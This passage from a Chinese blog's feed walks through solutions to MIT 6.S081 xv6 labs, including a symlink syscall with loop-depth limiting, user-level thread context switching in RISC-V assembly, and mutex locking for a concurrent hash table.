class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span>target<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> n1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>实现了符号链接的创建之后，还需要修改 <code>sys_open()</code>，实现对符号链接的特殊处理：当该文件是一个符号链接并且需要以跟随（follow）的方式打开时，就不断向下递归，将当前的 inode 指针指向符号链接指向文件的 inode，直到 inode 指针对应的文件类型不是符号链接，此时该 inode 指针指向的文件才是本次 <code>sys_open()</code> 系统调用实际需要打开的文件。</p><p>这里要用到两个关键函数 <code>readi()</code> 和 <code>namei()</code>。其中 <code>readi()</code> 能够根据 inode 指针，从该 inode 指针对应的文件中读取数据；而 <code>namei()</code> 能够根据指定的路径，返回该路径对应文件的 inode 指针。“跟随”的基本流程就是先使用读取当前 inode 中的数据，即目标文件路径 path，再将当前 inode 指针指向 path 目录对应的文件，以此往复。</p><p>最后还有一个小细节，就是当多个符号链接形成一个环时，这样的“跟随”过程就可能会导致死循环，因此必须加以限制，这里为了实现的方便，只是设定了一个最大递归深度，当递归深度超过该设定最大值时，文件打开就会失败。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>omode <span class="token operator">&amp;</span> O_NOFOLLOW<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> depth <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>     <span class="token comment">// max recursive depth</span>    <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>next<span class="token punctuation">;</span> <span class="token comment">// next inode</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>depth <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ip<span class="token operator">-></span>type <span class="token operator">==</span> T_SYMLINK<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// read data from file that ip points to to path</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">readi</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span>path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// get inode of file in the path</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>next <span class="token operator">=</span> <span class="token function">namei</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>        ip <span class="token operator">=</span> next<span class="token punctuation">;</span>        <span class="token operator">--</span>depth<span class="token punctuation">;</span>        <span class="token function">ilock</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>depth <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex 7a7e380..37a202c 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -188,6 +188,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_grind\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_symlinktest\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/fcntl.h b/kernel/fcntl.hindex 44861b9..b42df18 100644<span class="token coord">--- a/kernel/fcntl.h</span><span class="token coord">+++ b/kernel/fcntl.h</span><span class="token coord">@@ -3,3 +3,4 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define O_RDWR    0x002</span><span class="token prefix unchanged"> </span><span class="token line">#define O_CREATE  0x200</span><span class="token prefix unchanged"> </span><span class="token line">#define O_TRUNC   0x400</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define O_NOFOLLOW 0x800</span></span>\ No newline at end of filediff --git a/kernel/stat.h b/kernel/stat.hindex 19543af..46ba47f 100644<span class="token coord">--- a/kernel/stat.h</span><span class="token coord">+++ b/kernel/stat.h</span><span class="token coord">@@ -1,6 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define T_DIR     1   // Directory</span><span class="token prefix unchanged"> </span><span class="token line">#define T_FILE    2   // File</span><span class="token prefix unchanged"> </span><span class="token line">#define T_DEVICE  3   // Device</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define T_SYMLINK 4   // Symbol link</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">struct stat &#123;</span><span class="token prefix unchanged"> </span><span class="token line">  int dev;     // File system's disk device</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..1697b62 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -104,6 +104,7 @@ extern uint64 sys_unlink(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_symlink(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -127,6 +128,7 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_symlink] sys_symlink,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..0fbf6ed 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,3 +20,4 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_symlink 22</span></span>\ No newline at end of filediff --git a/kernel/sysfile.c b/kernel/sysfile.cindex 5dc453b..ae342c8 100644<span class="token coord">--- a/kernel/sysfile.c</span><span class="token coord">+++ b/kernel/sysfile.c</span><span class="token coord">@@ -15,6 +15,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#include "sleeplock.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "file.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "fcntl.h"</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#include "buf.h"</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// Fetch the nth word-sized system call argument as a file descriptor</span><span class="token prefix unchanged"> </span><span class="token line">// and return both the descriptor and the corresponding struct file.</span></span>@@ -316,6 +317,35 @@ sys_open(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if (!(omode &amp; O_NOFOLLOW)) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    int depth = 10;</span><span class="token prefix inserted">+</span><span class="token line">    struct inode *next;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    while (depth > 0 &amp;&amp; ip->type == T_SYMLINK) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      if (readi(ip, 0, (uint64)path, 0, MAXPATH) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">        end_op();</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">      &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">      if ((next = namei(path)) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">        end_op();</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">      &#125;</span><span class="token prefix inserted">+</span><span class="token line">      iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">      ip = next;</span><span class="token prefix inserted">+</span><span class="token line">      --depth;</span><span class="token prefix inserted">+</span><span class="token line">      ilock(ip);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    if (depth &lt;= 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">      end_op();</span><span class="token prefix inserted">+</span><span class="token line">      return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(ip->type == T_DEVICE &amp;&amp; (ip->major &lt; 0 || ip->major >= NDEV))&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    iunlockput(ip);</span><span class="token prefix unchanged"> </span><span class="token line">    end_op();</span></span>@@ -484,3 +514,28 @@ sys_pipe(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_symlink(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  int n1, n2;</span><span class="token prefix inserted">+</span><span class="token line">  char target[MAXPATH], path[MAXPATH];</span><span class="token prefix inserted">+</span><span class="token line">  struct inode *ip;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  if ((n1 = argstr(0, target, MAXPATH)) &lt; 0 || (n2 = argstr(1, path, MAXPATH)) &lt; 1) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // create symbol link in the path</span><span class="token prefix inserted">+</span><span class="token line">  begin_op();</span><span class="token prefix inserted">+</span><span class="token line">  if ((ip = create(path, T_SYMLINK, 0, 0)) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    end_op();</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  if (writei(ip, 0, (uint64)target, 0, n1) &lt; n1) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    end_op();</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">  end_op();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/user/user.h b/user/user.hindex b71ecda..883ef48 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span>@@ -23,6 +23,7 @@ int getpid(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int symlink(char *, char *);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 01e426e..65a8d6b 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,3 +36,4 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("symlink");</span></span>\ No newline at end of file</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Large-files&quot;&gt;&lt;a href=&quot;#Large-files&quot; class=&quot;headerlink&quot; title=&quot;Large files&quot;&gt;&lt;/a&gt;Large files&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;head</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Multithreading</title>
    <link href="http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/"/>
    <id>http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/</id>
    <published>2024-08-13T10:03:11.000Z</published>
    <updated>2024-08-14T08:16:25.833Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Uthread-switching-between-threads"><a href="#Uthread-switching-between-threads" class="headerlink" title="Uthread: switching between threads"></a>Uthread: switching between threads</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>xv6 已经实现了进程的切换机制，本实验要求参考进程的切换，实现一个用户态线程的切换。</p><p>要实现线程切换，必然涉及上下文，即寄存器的保存和恢复，那么需要保存哪些寄存器？实际上，只需要保存被调用者保存寄存器（callee-saved registers），而实现调用者保存寄存器（caller-saved registers）的保存与恢复的代码由编译器自动生成。关于调用者保存与被调用者保存寄存器有哪些可以参照下述 RISC-V 的 calling convention：</p><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/call.png"></p><p>另外，根据 <code>user/uthread_switch.S</code> 的注释，<code>thread_switch</code> 最后通过 <code>ret</code> 指令将当前程序计数器的值切换为 ra 寄存器中存储的地址，实现进程的“切换”，因此 <code>struct thread</code> 中还需要保存每个线程对应程序的起始地址（即函数指针）。</p><p>在了解需要保存哪些寄存器之后以及如何进行线程切换之后，还有一个细节需要考虑，即栈指针寄存器（sp）的初始化。线程栈的存储位置为 <code>struct thread</code> 中的 <code>stack</code> 数组，那么 sp 应该指向 <code>stack</code> 的位置，但由于栈的地址从大到小增长，因此 <code>sp</code> 应该初始化为 <code>(uint64)t-&gt;stack + STACK_SIZE</code>.</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/user/uthread.c b/user/uthread.cindex 06349f5..74b7f20 100644<span class="token coord">--- a/user/uthread.c</span><span class="token coord">+++ b/user/uthread.c</span><span class="token coord">@@ -12,6 +12,20 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">struct thread &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  /* 0 */  uint64 ra;</span><span class="token prefix inserted">+</span><span class="token line">  /* 8 */  uint64 sp;</span><span class="token prefix inserted">+</span><span class="token line">  /* 16 */  uint64 s0;</span><span class="token prefix inserted">+</span><span class="token line">  /* 24 */ uint64 s1;</span><span class="token prefix inserted">+</span><span class="token line">  /* 32 */ uint64 s2;</span><span class="token prefix inserted">+</span><span class="token line">  /* 40 */ uint64 s3;</span><span class="token prefix inserted">+</span><span class="token line">  /* 48 */ uint64 s4;</span><span class="token prefix inserted">+</span><span class="token line">  /* 56 */ uint64 s5;</span><span class="token prefix inserted">+</span><span class="token line">  /* 64 */ uint64 s6;</span><span class="token prefix inserted">+</span><span class="token line">  /* 72 */ uint64 s7;</span><span class="token prefix inserted">+</span><span class="token line">  /* 80 */ uint64 s8;</span><span class="token prefix inserted">+</span><span class="token line">  /* 88 */ uint64 s9;</span><span class="token prefix inserted">+</span><span class="token line">  /* 96 */ uint64 s10;</span><span class="token prefix inserted">+</span><span class="token line">  /* 104 */ uint64 s11;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  char       stack[STACK_SIZE]; /* the thread's stack */</span><span class="token prefix unchanged"> </span><span class="token line">  int        state;             /* FREE, RUNNING, RUNNABLE */</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>@@ -62,6 +76,7 @@ thread_schedule(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">     * Invoke thread_switch to switch from t to next_thread:</span><span class="token prefix unchanged"> </span><span class="token line">     * thread_switch(??, ??);</span><span class="token prefix unchanged"> </span><span class="token line">     */</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">thread_switch((uint64)t, (uint64)current_thread);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125; else</span><span class="token prefix unchanged"> </span><span class="token line">    next_thread = 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -76,6 +91,8 @@ thread_create(void (*func)())<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  t->state = RUNNABLE;</span><span class="token prefix unchanged"> </span><span class="token line">  // YOUR CODE HERE</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  t->ra = (uint64)func;</span><span class="token prefix inserted">+</span><span class="token line">  t->sp = (uint64)t->stack + STACK_SIZE;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void </span></span>diff --git a/user/uthread_switch.S b/user/uthread_switch.Sindex 5defb12..0eb0a2c 100644<span class="token coord">--- a/user/uthread_switch.S</span><span class="token coord">+++ b/user/uthread_switch.S</span><span class="token coord">@@ -7,5 +7,34 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">.globl thread_switch</span><span class="token prefix unchanged"> </span><span class="token line">thread_switch:</span></span>/* YOUR CODE HERE */<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">sd ra, 0(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd sp, 8(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s0, 16(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s1, 24(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s2, 32(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s3, 40(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s4, 48(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s5, 56(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s6, 64(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s7, 72(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s8, 80(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s9, 88(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s10, 96(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s11, 104(a0)</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">ld ra, 0(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld sp, 8(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s0, 16(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s1, 24(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s2, 32(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s3, 40(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s4, 48(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s5, 56(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s6, 64(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s7, 72(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s8, 80(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s9, 88(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s10, 96(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s11, 104(a1)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">ret    /* return to ra */</span></span></code></pre><h1 id="Using-threads"><a href="#Using-threads" class="headerlink" title="Using threads"></a>Using threads</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>后两个实验与 xv6 无关，而是练习使用 POSIX 线程库在实际的 Linux 平台进行并发编程。</p><p>本实验要求使用锁机制，实现一个支持并发的哈希表。首先需要确定的是：哪部分的操作会出现竞态（race condition）？根据观察不难得知 <code>put()</code> 操作可能存在下面这种情况：</p><blockquote><p>线程 1 和线程 2 本次 <code>put()</code> 映射到一个桶中（i 相同），都执行完 line 46 ~ 49 的循环之后，e 都为 0，随后先后执行 <code>insert()</code>，都创建一个新的 entry，并先后更新 <code>table[i]</code> 的值，导致先插入的键被覆盖。<br>像这样，在一次插入操作未完成的情况下，另一次插入也开始进行且映射到一个桶中，就会导致丢键（keys missing）的情况发生。</p></blockquote><p>首先最简单无脑的办法就是给整个 <code>put()</code> 函数加一把大锁：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// update the existing key.</span>    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// the new is new.</span>    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock1.png"></p><p>可以看到，keys missing 的问题已经被解决，但是大锁带来的就是更低的性能，实际上根据上图可知，该实现在双核情况下的运行速度甚至慢于单核。</p><p>实际上，对 <code>table</code> 数组的遍历并不会导致竞态，因此将加锁的操作延迟到遍历结束后：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// update the existing key.</span>    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// the new is new.</span>    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock2.png"></p><p>做了上述修改后，仍然没有出现 key missing 的情况，同时效率提升了一倍以上。</p><p>最后，更细化一些，只有当两个 <code>put()</code> 映射到同一个桶时才会发生竞态，因此可以为每个桶分别设置一把锁，以进一步提高并发性：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token 